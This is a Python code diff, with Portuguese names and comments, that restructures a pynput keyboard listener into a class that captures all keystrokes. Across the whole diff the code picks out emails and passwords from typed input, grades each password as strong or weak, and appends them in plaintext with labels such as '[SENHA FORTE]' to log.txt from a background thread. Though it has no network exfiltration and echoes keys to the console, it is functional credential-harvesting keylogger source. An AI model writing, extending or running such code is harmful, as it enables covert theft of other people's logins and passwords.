@@ -1,36 +1,79 @@
 import threading
-from pynput.keyboard import Listener, Key  # Importando Key
+import re
+from pynput.keyboard import Listener, Key
 
-senha = []
-email = []
+class DetectorDePalavras:
+    def __init__(self):
+        self.senha = []
+        self.caracteres_especiais = ('!', '@', '#', '$', '%', '^', '&', '*')
+        self.arquivo_log = 'log.txt'
+        self.alertou_caractere_especial = False
 
-# Tupla de caracteres especiais
-caracteres_especiais = ('!', '@', '#', '$', '%', '^', '&', '*')
+    def se_press(self, key):
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.senha.append(key.char)
+                print(f"Tecla pressionada: {key.char}")
+        except AttributeError:
+            print(f"Tecla especial pressionada: {key}")
 
-def se_press(key):
-    try:
-        # Verifica a tecla pressionada e adiciona à lista de senha
-        if hasattr(key, 'char') and key.char is not None: #o hasattr verifica se a tecla tem um char (ele é uma função que verifica se um objeto no exemplo o 'key' tem um atributo 'char')
-            senha.append(key.char) # faz com que a letra digitada seja adicionada no final da variavel 'senha' que foi criada
-            print(f"Tecla pressionada: {key.char}")
-    except AttributeError: # é usado para lidar com a situação em que o objeto key não tem um atributo 'char' (ou seja ele não é um caractere)
-        # Se a tecla for especial, como Shift ou Ctrl
-        print(f"Tecla especial pressionada: {key}")
-        
-       # Verifica se algum caractere especial está na senha
-    if any(caractere in senha for caractere in caracteres_especiais):
-        print(f"Possível senha com caracteres especiais: {''.join(senha)}")
+        palavra = ''.join(self.senha).strip()
 
-def on_release(key):
-    # Para o listener quando a tecla 'esc' for pressionada
-    if key == Key.esc:  # Agora 'Key' está definido
-        return False
+        # Só mostra alerta de caractere especial se NÃO for email
+        if (not self.eh_email(palavra) and
+            self.tem_caracter_especial() and
+            not self.alertou_caractere_especial):
+            print(f"Possível senha com caracteres especiais: {palavra}")
+            self.alertou_caractere_especial = True
 
-# Inicia o listener de teclado em uma thread separada
+        # Quando pressionar Enter, processa a entrada
+        if key == Key.enter:
+            if palavra:
+                if self.eh_email(palavra):
+                    self.salvar_em_arquivo(f"[EMAIL] {palavra}")
+                    print(f"Email detectado: {palavra}")
+                elif self.eh_senha_forte(palavra):
+                    self.salvar_em_arquivo(f"[SENHA FORTE] {palavra}")
+                    print(f"Senha forte detectada: {palavra}")
+                else:
+                    self.salvar_em_arquivo(f"[SENHA FRACA] {palavra}")
+                    print(f"Senha fraca detectada: {palavra}")
+            self.senha.clear()
+            self.alertou_caractere_especial = False
+
+    def tem_caracter_especial(self):
+        return any(c in self.caracteres_especiais for c in self.senha)
+
+    def eh_senha_forte(self, senha):
+        return (
+            len(senha) >= 8 and
+            any(c.islower() for c in senha) and
+            any(c.isupper() for c in senha) and
+            any(c.isdigit() for c in senha) and
+            any(c in self.caracteres_especiais for c in senha)
+        )
+
+    def eh_email(self, texto):
+        padrao_email = r'^[\w\.-]+@[\w\.-]+\.\w+$'
+        return re.match(padrao_email, texto) is not None
+
+    def salvar_em_arquivo(self, texto):
+        with open(self.arquivo_log, 'a', encoding='utf-8') as f:
+            f.write(texto + '\n')
+
+    def on_release(self, key):
+        if key == Key.esc:
+            return False
+
+    def iniciar(self):
+        with Listener(on_press=self.se_press, on_release=self.on_release) as listener:
+            listener.join()
+
+
+# Inicia o detector em uma thread separada
 def start_listener():
-    with Listener(on_press=se_press, on_release=on_release) as listener:
-        listener.join()
+    detector = DetectorDePalavras()
+    detector.iniciar()
 
-# Cria e inicia a thread para escutar as teclas pressionadas
 listener_thread = threading.Thread(target=start_listener)
 listener_thread.start()
